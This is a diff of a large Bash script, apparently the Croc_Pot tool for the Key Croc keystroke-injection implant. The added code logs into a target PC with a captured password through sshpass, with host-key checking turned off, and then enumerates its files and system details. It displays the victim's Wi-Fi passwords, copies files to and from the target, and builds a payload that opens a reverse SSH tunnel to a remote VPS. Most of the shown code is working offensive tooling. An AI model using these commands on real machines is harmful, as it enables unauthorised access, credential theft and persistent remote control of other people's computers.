@@ -5611,6 +5885,7 @@ cpu_check() {
 	more /proc/cpuinfo && lscpu | grep MHz --color=auto | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; lscpu | egrep 'Model name|Socket|Thread|NUMA|CPU\(s\)' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
 	echo "Threads/core: $(nproc --all)" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; echo "Number of CPU/cores online at $HOSTNAME: $(getconf _NPROCESSORS_ONLN)" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
 	echo -ne "CPU TEMP: $(cat /sys/class/thermal/thermal_zone0/temp)°C USAGE: $(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')\n" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
+	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
 }
 tcp_check() {
 	clear
@@ -5622,6 +5897,7 @@ tcp_check() {
 	iw wlan0 scan | egrep --extended-regexp 'BSS ([[:xdigit:]]{1,2}:)|signal: |SSID: |\* Manufacturer: |\* Model Number: |\* Serial Number: |\* Device name: ' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
 	arp -a -e -v | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; ss -p -a | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; for interface in $(ls /sys/class/net/); do echo -ne "${interface}\n"; done | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; /sbin/ifconfig -a | tee -a ${LOOT_INFO}
 	echo ${LINE} | tee -a ${LOOT_INFO} ; curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; speedtest | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
+	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
 }
 kernel_check() {
 	clear
@@ -5629,6 +5905,7 @@ kernel_check() {
 	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}KERNEL STATUS${LINE_}\n" | tee -a ${LOOT_INFO}
 	echo -ne "\n$(ColorYellow 'Kernel version on') ${server_name} is:\n" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
 	uname --all | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; hostnamectl | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; cat /proc/version | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
+	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
 }
 processes_check() {
 	clear
@@ -5637,6 +5914,7 @@ processes_check() {
 	echo -ne "${yellow}Last logins:${clear}\n" | tee -a ${LOOT_INFO} ; last -a | head -3 | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
 	echo -ne "\n$(ColorYellow 'Running Processes') ${server_name} is:\n" | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
 	ps -aux | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; service --status-all | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; findmnt -A | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO} ; usb-devices | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
+	sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
 }
 ##
 #----Status check all KeyCroc info
@@ -5657,6 +5935,7 @@ ${LINE}\nRUNNING SERVICES:\n$(service --status-all)\n${LINE}\nINSTALLED PACKAGES
 #----Status of target pc info
 ##
 pc_info() {
+	local TARGET_USERNAME=$(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)
 	clear
 	rm ${LOOT_INFO}
 	local CROC_OS=/root/udisk/tools/Croc_Pot/Croc_OS.txt
@@ -5667,18 +5946,24 @@ if [ "$(OS_CHECK)" = WINDOWS ]; then
 $(ColorYellow 'Target PC Host name:')${green} $(sed -n 3p ${CROC_OS})${clear}
 $(ColorYellow 'Target PC Passwd:')${green} $(target_pw)${clear}
 $(ColorYellow 'Target Pc user name:')${green} $(sed -n 1p ${CROC_OS_TARGET})${clear}
-$(ColorYellow 'Target Pc IP:')${green} $(sed '2,6!d' ${CROC_OS_TARGET})${clear}
+$(ColorYellow 'Target Pc IP:')${green} $(sed '2,6!d' ${CROC_OS_TARGET})${clear}\n${LINE}
 $(ColorYellow 'Target Pc SSID + PASSWD and MAC address:')${green}
-$(sed '9,24!d' ${CROC_OS_TARGET})${clear}\n" | tee -a ${LOOT_INFO}
+$(sed '9,24!d' ${CROC_OS_TARGET})${clear}\n${LINE}\n" | tee -a ${LOOT_INFO}
+sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'powershell -Command "& {Get-ChildItem -Recurse | ?{ $_.PSIsContainer } | Select-Object FullName, ` @{Name=\"FileCount\";Expression={(Get-ChildItem $_ -File | Measure-Object).Count }}}"' 2> /dev/null | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
+sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'powershell -Command "& {systeminfo}"' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
+sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
 elif [ "$(OS_CHECK)" = LINUX ]; then
 	croc_title_loot | tee ${LOOT_INFO} ; echo -e "\n\t${LINE_}TARGET PC INFO${LINE_}\n" | tee -a ${LOOT_INFO}
 	echo -ne "\n$(ColorYellow 'KeyCroc is pluged into:')${green} $(OS_CHECK)${clear}
 $(ColorYellow 'Target PC Host name:')${green} $(sed -n 3p ${CROC_OS})${clear}
 $(ColorYellow 'Target PC Passwd:')${green} $(target_pw)${clear}
 $(ColorYellow 'Target Pc user name:')${green} $(sed -n 1p ${CROC_OS_TARGET})${clear}
-$(ColorYellow 'Target Pc IP:')${green} $(sed -n '2,3p' ${CROC_OS_TARGET})${clear}
+$(ColorYellow 'Target Pc IP:')${green} $(sed -n '2,3p' ${CROC_OS_TARGET})${clear}\n${LINE}
 $(ColorYellow 'Target Pc SSID + PASSWD and MAC address:')${green} 
-$(sed '4,20!d' ${CROC_OS_TARGET})${clear}\n" | tee -a ${LOOT_INFO}
+$(sed '4,20!d' ${CROC_OS_TARGET})${clear}\n${LINE}\n" | tee -a ${LOOT_INFO}
+sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'hostnamectl ; echo "'${LINE}'" ; netstat -r' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
+echo -ne "${cyan}TARGET PC-DIRECTORY${clear}\n" | tee -a ${LOOT_INFO} ; sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'cd / ; for i in `ls -d */` ; do g=`sudo find ./$i -type f -print | wc -l` ; echo -ne "'${yellow}'Directory: '${clear}''${cyan}'${i} '${clear}''${yellow}'Contains: '${clear}''${green}'${g} '${clear}''${yellow}'files.'${clear}'\n"; done 2> /dev/null' | tee -a ${LOOT_INFO} ; echo ${LINE} | tee -a ${LOOT_INFO}
+sed -i -r "s/[[:cntrl:]]\[([0-9]{1,3};)*[0-9]{1,3}m//g" ${LOOT_INFO}
 else
 	echo -ne "$(ColorRed 'PLEASE RUN CROC_POT PAYLOAD TO GET TARGET PC USER NAME AND IP')"
 fi
@@ -5756,7 +6041,7 @@ fi
 	esac
 }
 ##
-#----Croc Status check local weather
+#----Status check local weather
 ##
 check_weather() {
 	Q ALT-SPACE
@@ -5772,7 +6057,7 @@ check_weather() {
 	menu_A
 }
 ##
-#----Croc Status Menu
+#----Status Menu
 ##
 menu_A() {
 	LED B
@@ -5796,12 +6081,10 @@ function croc_edit_menu() {
 #----Edit all files Function
 ##
 edit_all() {
-	cd ${*}
-	ls -R --color=auto
-	ls -aRd $PWD/* --color=auto
+	f=`find ${1} -type f -name "*.*"` ; echo -ne "${green}${f}${clear}\n"
 	echo ""
 	read_all ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]
-if [ -e "${r_a}" ]; then
+if [ -f "${r_a}" ]; then
 	nano ${r_a}
 else
 	invalid_entry ; croc_edit_menu
@@ -5821,27 +6104,37 @@ fi
 #----Edit remove file Function
 ##
 remove_file() {
-	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo "Directory $i contains $g files."; done
-	read_all ENTER THE FOLDER NAME TO VEIW FILES ; local r_f=${r_a}
-	find /${r_f} -type f -name "*.*"
-	read_all ENTER THE FILE NAME YOU WISH TO REMOVE AND PRESS [ENTER]
-if [ -e "${r_a}" ]; then
+	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null
+	read_all ENTER THE DIRECTORY NAME TO VEIW FILES ; local f_n=${r_a}
+	f=`find /${f_n} -type f -name "*.*"` ; echo -ne "${red}${f}${clear}\n"
+	read_all ENTER THE FILE NAME YOU WISH TO REMOVE AND PRESS [ENTER] ; local r_f=${r_a}
+if [ -f "${r_f}" ]; then
+	echo -ne ${LINE_}"\e[5m$(ColorRed 'This file will be removed') ${r_f}"${LINE_} ; echo -ne "\n"
+	read_all REMOVE FILE Y/N AND PRESS [ENTER]
+	case $r_a in
+[yY] | [yY][eE][sS])
 	LED R
-	echo -ne ${LINE_}"\e[5m$(ColorRed 'This file will be removed') ${r_a}"${LINE_}
-	rm -f ${r_a}
+	echo -ne ${LINE_}"\e[5m$(ColorRed 'Removing this file') ${r_f}"${LINE_}
+	rm -f ${r_f} ;;
+[nN] | [nN][oO])
+	LED B
+	echo -ne "\n$(ColorYellow 'Did not make any changes')\n" ;;
+*)
+	invalid_entry ; remove_file ;;
+esac
 else
 	invalid_entry ; croc_edit_menu
 fi
 }
 ##
-#----Edit any file on keycroc file Function
+#----Edit any file on keycroc Function
 ##
 user_edit() {
-	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo "Directory $i contains $g files."; done
-	read_all ENTER THE FOLDER NAME TO VEIW FILES ; local r_f=${r_a}
-	find /${r_f} -type f -name "*.*"
+	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null
+	read_all ENTER THE DIRECTORY NAME TO VEIW FILES ; local r_f=${r_a}
+	f=`find /${r_f} -type f -name "*.*"` ; echo -ne "${green}${f}${clear}\n"
 	read_all ENTER THE FILE NAME TO EDIT AND PRESS [ENTER]
-if [ -e "${r_a}" ]; then
+if [ -f "${r_a}" ]; then
 	nano ${r_a}
 else
 	invalid_entry ; croc_edit_menu
@@ -5964,7 +6257,7 @@ fi ;;
 esac
 }
 ##
-#----Croc Edit Menu
+#----Croc_Pot Edit Menu
 ##
 	LED B
 MenuTitle CROC EDIT MENU ; MenuColor 22 1 CROC PAYLOADS FOLDER ; MenuColor 22 2 CROC TOOLS FOLDER ; MenuColor 22 3 CROC LOOT FOLDER ; MenuColor 22 4 CROC CONFIG FILE ; MenuColor 22 5 CROC ENTER FILE NAME ; MenuColor 22 6 CROC REMOVE FILES
@@ -5975,7 +6268,7 @@ MenuColor 22 7 ATTACKMODE HID STORAGE ; MenuColor 22 8 ATTACKMODE HID ; MenuColo
 	esac
 }
 ##
-#----SSH menu/function
+#----Croc_Pot SSH menu/function
 ##
 function ssh_menu() {
 	LED B
@@ -5994,10 +6287,10 @@ if [[ $? -ne 0 ]]; then
 	if [[ $? -ne 0 ]]; then
 		echo -ne "\e[5m$(ColorRed 'Can not start SSH connect on:')${2}${clear}"
 	elif [[ "${#args[@]}" -eq 0 ]]; then
-		ssh root@${2}
+		ssh -o "StrictHostKeyChecking no" root@${2}
 	fi
 elif [[ "${#args[@]}" -eq 0 ]]; then
-		ssh root@${1}
+		ssh -o "StrictHostKeyChecking no" root@${1}
 else
 		echo -ne "\e[5m$(ColorRed 'Can not start SSH connect on:')${1}${clear}"
 fi
@@ -6165,13 +6458,14 @@ fi
 -SSH into HAK5 gear & TARGET PC
 -Reverse ssh tunnel, Create SSH Public/Private Key
 -Ensure devices are connected to the same local network As keycroc')\n"
+user_agent_random
 local croc_mac=$(cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address)
-local croc_city=$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=city)
-local croc_country=$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=country)
-local croc_region=$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=region)
-local croc_isp=$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=isp | awk '{print $1}')
+local croc_city=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=city)
+local croc_country=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=country)
+local croc_region=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=region)
+local croc_isp=$(curl -Lsf -A "$userAgent" --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=isp | awk '{print $1}')
 check_device $(os_ip) TARGET PC
-echo -ne "\e[38;5;19;4;1;48;5;245mPublic ip${clear}${yellow}:${clear}${green}$(curl -s --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com) ${clear}${yellow}COUNTRY:${clear}${green}${croc_country} ${clear}${yellow}CITY:${clear}${green}${croc_city}${clear}${yellow}/${clear}${green}${croc_region} ${clear}${yellow}ISP:${clear}${green}${croc_isp}${clear}\n"
+echo -ne "\e[38;5;19;4;1;48;5;245mPublic ip${clear}${yellow}:${clear}${green}$(curl -s -A "$userAgent" --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com) ${clear}${yellow}COUNTRY:${clear}${green}${croc_country} ${clear}${yellow}CITY:${clear}${green}${croc_city}${clear}${yellow}/${clear}${green}${croc_region} ${clear}${yellow}ISP:${clear}${green}${croc_isp}${clear}\n"
 ssid_check ; check_device croc KEY CROC_ | sed 's/--/'$croc_mac'/g'
 default_ip 172.16.42.1 ; check_device mk7 WIFI PINEAPPLE7 
 saved_mac /root/udisk/tools/Croc_Pot/squirrel_mac.txt 1p ; default_ip 172.16.32.1 ; check_device squirrel PACKET SQUIRREL
@@ -6277,8 +6571,8 @@ kismet_custom() {
 	read_all ENTER FIRST COLOR CODE AND PRESS [ENTER] ; local first_color=${r_a}
 	read_all ENTER FIRST BRIGHTNESS CODE AND PRESS [ENTER] ; local first_bright=${r_a}
 	read_all ENTER SECOND COLOR CODE AND PRESS [ENTER] ; local second_color=${r_a}
-	read_all ENTER SECOND BRIGHTNESS CODE AND PRESS [ENTER] ; local first_bright=${r_a}
-	ssh root@mk7 LEDMK7 -a ${first_color},${first_bright} -b ${second_color},${first_bright}
+	read_all ENTER SECOND BRIGHTNESS CODE AND PRESS [ENTER] ; local second_bright=${r_a}
+	ssh root@mk7 LEDMK7 -a ${first_color},${first_bright} -b ${second_color},${second_bright}
 }
 ##
 #----SSH wifi pineapple kismet led mod menu 
@@ -6606,11 +6900,10 @@ croc_reverse_shell() {
 	echo -ne "$(Info_Screen '
 # 1 Start reverse shell with nc start listening on remote-server first
 # 2 Start listening on the keycroc
-# 3 Create payload to start reverse shell KeyCroc to remote-server
-# 4 Start reverse ssh tunnel target pc to KeyCroc
-# 5 Start reverse ssh tunnel Keycroc to remote-server
-# 6 Send remote commands with ssh
-# 7 Send remote files with SCP')\n\n"
+# 3 Start reverse ssh tunnel target pc to KeyCroc
+# 4 Start reverse ssh tunnel Keycroc to remote-server
+# 5 Send remote commands with ssh
+# 6 Send remote files with SCP')\n\n"
 shell_input() {
 	unset IP_RS IP_RSP IP_RSN
 	rm /root/udisk/tools/Croc_Pot/saved_shell.txt 2> /dev/null
@@ -6684,47 +6977,7 @@ case $r_a in
 	invalid_entry ; croc_reverse_shell ;;
 esac
 }
-##
-#----SSH reverse ssh tunnel keycroc (payload)
-##
-reverse_payload() {
-	clear
-	echo -ne "$(Info_Screen '
--Create Reverse SSH Tunnel Payload keycroc to remote-server
--Plug keycroc into Target pc and type in croctunnel
--Keycroc side will be setup as below
--->ssh -fN -R port#:localhost:22 username@your-server-ip
--Enter on remote-server side as below
--->ssh root@localhost -p port#')\n"
-local PAYLOAD_SHELL=/root/udisk/payloads/Croc_Shell.txt
-if [ -e "${PAYLOAD_SHELL}" ]; then
-	echo -ne "\n$(ColorGreen 'Croc_Shell already exists')\n"
-	cat ${PAYLOAD_SHELL}
-	echo ""
-	read_all WOULD YOU LIKE TO KEEP THIS SETUP Y/N AND PRESS [ENTER]
-case $r_a in
-[yY] | [yY][eE][sS])
-	echo -ne "\n$(ColorGreen 'Keeping existing Croc_Shell Payload')\n" ;;
-[nN] | [nN][oO])
-	rm ${PAYLOAD_SHELL}
-	shell_input
-	echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to your server
-# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
-#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" >> ${PAYLOAD_SHELL}
-	echo -ne "\n$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\n"
-	cat ${PAYLOAD_SHELL} ;;
-*)
-	invalid_entry ; croc_reverse_shell ;;
-esac
-else
-	echo -ne "\n$(ColorRed 'Did not find Croc_Shell Payload')\n"
-	shell_input
-	echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to your server
-# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
-#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" >> ${PAYLOAD_SHELL}
-	echo -ne "\n$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\n"
-fi
-}
+
 ##
 #----SSH reverse ssh tunnle with target pc to keycroc
 ##
@@ -6832,49 +7085,126 @@ else
 fi
 }
 ##
-#----SSH start a Reverse SSH Tunnel Keycroc to remote-server
+#----SSH start a Reverse SSH Tunnel Keycroc to virtual private server (VPS)
 ##
 ssh_tunnel() {
-	clear
+	local SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
 	echo -ne "$(Info_Screen '
--Start a Reverse SSH Tunnel Keycroc to remote-server
--Remotely access keycroc from a remote-server VPS
--Keycroc will be setup with these setting below
+-Start a Reverse SSH Tunnel Keycroc to virtual private server (VPS)
+-Remotely access keycroc from VPS or SSH to VPS
+-Keycroc will be setup with these setting below:
 -\e[40;32mssh -fN -R port#:localhost:22 root@remote-server-ip\e[0m\e[40;93m
--ON remote-server side enter this below
+-ON VPS side enter this below:
 -\e[40;32mssh root@localhost -p port#')\n"
 start_tunnel() {
+	ping -q -c 2 -w 2 $(sed -n 1p ${SAVE_SHELL}) &>/dev/null 2>&1
+if [[ $? -ne 0 ]]; then
+	echo -ne "${red}Unable to reach VPS ${clear}$(sed -n 1p ${SAVE_SHELL})\n"
+	ssh_tunnel
+elif [[ "${#args[@]}" -eq 0 ]]; then
 	echo -ne "\n${yellow}Keycroc SETUP ${green}ssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL})${clear}\n"
-	echo -ne "\n${yellow}SERVER SETUP ${green}ssh root@localhost -p $(sed -n 2p ${SAVE_SHELL})${clear}\n"
+	echo -ne "\n${yellow}VPS SETUP ${green}ssh root@localhost -p $(sed -n 2p ${SAVE_SHELL})${clear}\n"
 	ssh -fN -R $(sed -n 2p ${SAVE_SHELL}):localhost:22 $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL})
+fi
 }
-read_all START REVERSE SSH TUNNEL Y/N AND PRESS [ENTER]
+ssh_vps() {
+	ping -q -c 2 -w 2 $(sed -n 1p ${SAVE_SHELL}) &>/dev/null 2>&1
+if [[ $? -ne 0 ]]; then
+	echo -ne "${red}Unable to start ssh on VPS ${clear}$(sed -n 1p ${SAVE_SHELL})\n"
+	ssh_tunnel
+elif [[ "${#args[@]}" -eq 0 ]]; then
+	sshpass -p $(sed -n 4p ${SAVE_SHELL}) ssh -o "StrictHostKeyChecking no" $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL})
+fi
+}
+vps_info() {
+	sshpass -p $(sed -n 4p ${SAVE_SHELL}) ssh -o "StrictHostKeyChecking no" $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL}) 'uptime ; 'echo ${LINE}' ; uname --all ; 'echo ${LINE}' ; cat /proc/version ; 'echo ${LINE}' ; ifconfig ; 'echo ${LINE}' ; last -a | head -3 ; 'echo ${LINE}' ; service --status-all ; 'echo ${LINE}''
+	sshpass -p $(sed -n 4p ${SAVE_SHELL}) ssh -o "StrictHostKeyChecking no" $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL}) 'ps -aux'
+}
+vps_command() {
+	read_all ENTER COMMAND AND PRESS [ENTER] ; local USER_COMMAND=${r_a}
+	sshpass -p $(sed -n 4p ${SAVE_SHELL}) ssh -o "StrictHostKeyChecking no" $(sed -n 3p ${SAVE_SHELL})@$(sed -n 1p ${SAVE_SHELL}) ''${USER_COMMAND}''
+}
+##
+#----SSH reverse ssh tunnel keycroc to VPS (payload)
+##
+reverse_payload() {
+	clear
+	echo -ne "$(Info_Screen '
+-Create Reverse SSH Tunnel Payload keycroc to remote-server
+-Plug keycroc into Target pc and type in croctunnel
+-Keycroc side will be setup as below
+-->ssh -fN -R port#:localhost:22 username@your-server-ip
+-Enter on remote-server side as below
+-->ssh root@localhost -p port#')\n"
+local PAYLOAD_SHELL=/root/udisk/payloads/Croc_Shell.txt
+if [ -e "${PAYLOAD_SHELL}" ]; then
+	echo -ne "\n$(ColorGreen 'Croc_Shell already exists')\n"
+	cat ${PAYLOAD_SHELL}
+	echo ""
+	read_all WOULD YOU LIKE TO KEEP THIS SETUP Y/N AND PRESS [ENTER]
 case $r_a in
 [yY] | [yY][eE][sS])
-	SAVE_SHELL=/root/udisk/tools/Croc_Pot/saved_shell.txt
+	echo -ne "\n$(ColorGreen 'Keeping existing Croc_Shell Payload')\n" ;;
+[nN] | [nN][oO])
+	rm ${PAYLOAD_SHELL}
+	shell_input
+	echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to your server
+# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
+#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" >> ${PAYLOAD_SHELL}
+	echo -ne "\n$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\n"
+	cat ${PAYLOAD_SHELL} ;;
+*)
+	invalid_entry ; croc_reverse_shell ;;
+esac
+else
+	echo -ne "\n$(ColorRed 'Did not find Croc_Shell Payload')\n"
+	shell_input
+	echo -ne "# Title:         Croc_ssh_Tunnel\n# Description:   Create a Reverse SSH Tunnel with keycroc to your server
+# Author:        spywill\n# Version:       1.0\n# Category:      Key Croc
+#\nMATCH croctunnel\n#\nssh -fN -R ${IP_RSP}:localhost:22 ${IP_RSN}@${IP_RS}\nLED ATTACK" >> ${PAYLOAD_SHELL}
+	echo -ne "\n$(ColorGreen 'Croc_shell PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')\n"
+fi
+}
 if [ -e "${SAVE_SHELL}" ]; then
-	echo -ne "\n$(sed -n 1p ${SAVE_SHELL}) Server IP\n$(sed -n 3p ${SAVE_SHELL}) User name\n$(sed -n 2p ${SAVE_SHELL}) Server Port\n"
-	read_all Found saved shell setup use them Y/N AND PRESS [ENTER]
-case $r_a in
+	echo -ne "\n${yellow}VPS IP: ${clear}$(sed -n 1p ${SAVE_SHELL})\n${yellow}VPS username: ${clear}$(sed -n 3p ${SAVE_SHELL})\n${yellow}VPS Port: ${clear}$(sed -n 2p ${SAVE_SHELL})\n"
+	read_all EXISTING VPS SETUP KEEP THEM Y/N AND PRESS [ENTER]
+	case $r_a in
 [yY] | [yY][eE][sS])
-	start_tunnel ;;
+	echo -ne "\n$(ColorYellow 'KEEPING EXISTING VPS SETUP')\n"
+	ping -q -c 2 -w 2 $(sed -n 1p ${SAVE_SHELL}) &>/dev/null 2>&1
+if [[ $? -ne 0 ]]; then
+	echo -ne "${red}Unable to reach VPS ${clear}$(sed -n 1p ${SAVE_SHELL})\n"
+elif [[ "${#args[@]}" -eq 0 ]]; then
+	MenuTitle REMOTE VPS MENU
+	MenuColor 24 1 START REVERSE SSH TUNNEL
+	MenuColor 24 2 CHECK VPS STATUS
+	MenuColor 24 3 START SSH TO VPS
+	MenuColor 24 4 REMOTE COMMAND TO VPS
+	MenuColor 24 5 REVERSE TUNNEL PAYLOAD
+	MenuColor 24 6 RETURN TO MAIN MENU
+	MenuEnd 27
+	case $m_a in
+	1) start_tunnel ;;
+	2) vps_info ; ssh_tunnel ;;
+	3) ssh_vps ;;
+	4) vps_command ; ssh_tunnel ;;
+	5) reverse_payload ; ssh_tunnel ;;
+	6) main_menu ;;
+	0) exit 0 ;;
+	[bB]) croc_reverse_shell ;;
+	*) invalid_entry ; start_tunnel ;;
+	esac
+fi ;;
 [nN] | [nN][oO])
 	rm ${SAVE_SHELL}
-	shell_input
-	start_tunnel ;;
+	shell_input ; user_input_passwd ${SAVE_SHELL} VPS ; ssh_tunnel ;;
 *)
 	invalid_entry ; ssh_tunnel ;;
 esac
 else
-	echo -ne "$(ColorRed 'Did not find any saved shell setup')\n"
-	shell_input
-	start_tunnel
-fi ;;
-[nN] | [nN][oO])
-	echo -ne "\n$(ColorYellow 'Maybe next time')\n" ;;
-*)
-	invalid_entry ; ssh_tunnel ;;
-esac
+	echo -ne "$(ColorRed 'Did not find any saved remote-server VPS shell setup')\n"
+	shell_input ; user_input_passwd ${SAVE_SHELL} VPS ; ssh_tunnel
+fi
 }
 ##
 #----SSH Copy a Local File to a Remote System with the scp Command
@@ -6897,12 +7227,16 @@ keycroc_target() {
 	echo -ne "$(Info_Screen '
 -Send file from keycroc to target pc
 -Save to target pc home')\n\n"
-	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo "Directory $i contains $g files."; done
-	read_all ENTER THE FOLDER NAME TO VEIW FILES ; local r_f=${r_a}
-	find /${r_f} -type f -name "*.*"
+	cd / ; for i in `ls -d */` ; do g=`find ./$i -type f -print | wc -l` ; echo -ne "${yellow}Directory: ${clear}${cyan}${i} ${clear}${yellow}Contains: ${clear}${green}${g} ${clear}${yellow}files.${clear}\n"; done 2> /dev/null
+	read_all ENTER THE DIRECTORY NAME TO VEIW FILES ; local r_f=${r_a}
+	f=`find /${r_f} -type f -name "*.*"` ; echo -ne "${green}${f}${clear}\n"
 	read_all ENTER THE FULL PATH OF FILE TO SEND
 	if [ -e "${r_a}" ]; then
-		sshpass -p $(target_pw) scp -o "StrictHostKeyChecking no" ${r_a} ${TARGET_USERNAME}@$(os_ip):~/
+		if [ "$(OS_CHECK)" = WINDOWS ]; then
+			sshpass -p $(target_pw) scp -o "StrictHostKeyChecking no" ${r_a} ${TARGET_USERNAME}@$(os_ip):/C:/
+		elif [ "$(OS_CHECK)" = LINUX ]; then
+			sshpass -p $(target_pw) scp -o "StrictHostKeyChecking no" ${r_a} ${TARGET_USERNAME}@$(os_ip):~/
+		fi
 	else
 		echo -ne "${red}File does not exist${clear}\n" ; invalid_entry
 	fi
@@ -6916,9 +7250,10 @@ target_keycroc() {
 -Receive file from target pc to keycroc
 -Save to keycroc loot/Croc_Pot
 -Will need to know the path of file on target pc')\n\n"
-	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" ${TARGET_USERNAME}@$(os_ip) 'cd / ; for i in `ls -d */` ; do g=`sudo find ./$i -type f -print | wc -l` ; echo "Directory $i contains $g files."; done'
-	read_all ENTER THE FOLDER NAME TO VEIW FILES ; local r_f=${r_a}
-	sshpass -p $(target_pw) ssh ${TARGET_USERNAME}@$(os_ip) 'find /'${r_f}' -type f -name "*.*"'
+if [ "$(OS_CHECK)" = WINDOWS ]; then
